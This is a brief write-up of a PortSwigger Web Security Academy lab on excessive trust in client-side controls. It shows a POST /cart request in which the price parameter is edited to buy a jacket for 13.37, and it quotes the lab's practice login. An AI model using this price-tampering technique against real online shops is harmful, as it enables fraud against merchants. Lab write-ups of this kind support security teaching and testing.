
# Excessive trust in client-side controls

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 

- https://portswigger.net/web-security/logic-flaws/examples



![img](images/Excessive%20trust%20in%20client-side%20controls/1.png)

---------------------------------------------

When the product is added to the cart, it is possible to change the price parameter:

```
POST /cart HTTP/2
...

productId=1&redir=PRODUCT&quantity=1&price=133700
```



![img](images/Excessive%20trust%20in%20client-side%20controls/2.png)


Changing the price to “1337” the price is 13,37 and we can purchase it:



![img](images/Excessive%20trust%20in%20client-side%20controls/3.png)